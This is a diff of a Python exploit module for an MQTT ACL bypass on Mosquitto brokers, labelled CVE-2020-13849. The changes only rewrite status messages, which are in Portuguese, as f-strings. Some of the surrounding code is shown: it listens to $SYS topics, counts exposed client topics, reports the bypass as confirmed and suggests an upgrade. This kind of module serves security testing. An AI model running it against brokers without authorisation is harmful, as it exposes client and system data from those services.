@@ -144,11 +144,11 @@ class Exploit(Exploit):
 
     @multi
     def run(self):
-        print_status("MQTT ACL Bypass via $SYS → {}:{}".format(self.target, self.port))
+        print_status(f"MQTT ACL Bypass via $SYS → {self.target}:{self.port}")
         print_info("CVE-2020-13849 — Mosquitto < 1.6.10 $SYS ACL bypass")
 
         if not self.check():
-            print_error("Broker não acessível em {}:{}".format(self.target, self.port))
+            print_error(f"Broker não acessível em {self.target}:{self.port}")
             return
 
         sock = None
@@ -170,7 +170,7 @@ class Exploit(Exploit):
             if not suback or (suback[0] & 0xF0) != 0x90:
                 print_warning("SUBACK não recebido ou inesperado")
 
-            print_status("Escutando mensagens $SYS por {} segundos...".format(self.listen_duration))
+            print_status(f"Escutando mensagens $SYS por {self.listen_duration} segundos...")
             messages = defaultdict(list)
             buffer = b""
             deadline = time.monotonic() + int(self.listen_duration)
@@ -196,7 +196,7 @@ class Exploit(Exploit):
                 print_info("Upgrade para Mosquitto >= 1.6.10 resolve o CVE-2020-13849")
                 return
 
-            print_success("Dados coletados de {} tópicos $SYS".format(len(messages)))
+            print_success(f"Dados coletados de {len(messages)} tópicos $SYS")
 
             headers = ["$SYS Topic", "Categoria", "Valor (amostra)"]
             rows = []
@@ -208,14 +208,14 @@ class Exploit(Exploit):
 
             client_topics = [t for t in messages if "client" in t.lower()]
             print_warning("CVE-2020-13849 CONFIRMADO: bypass de ACL $SYS bem-sucedido")
-            print_info("Topics de cliente expostos: {}".format(len(client_topics)))
-            print_info("Total de tópicos $SYS vazados: {}".format(len(messages)))
+            print_info(f"Topics de cliente expostos: {len(client_topics)}")
+            print_info(f"Total de tópicos $SYS vazados: {len(messages)}")
             print_info("Mitigação: upgrade Mosquitto >= 1.6.10")
 
             sock.sendall(struct.pack("!BB", 0xE0, 0x00))
 
         except (socket.timeout, OSError, ConnectionError) as exc:
-            print_error("Erro: {}".format(exc))
+            print_error(f"Erro: {exc}")
         finally:
             if sock:
                 try:
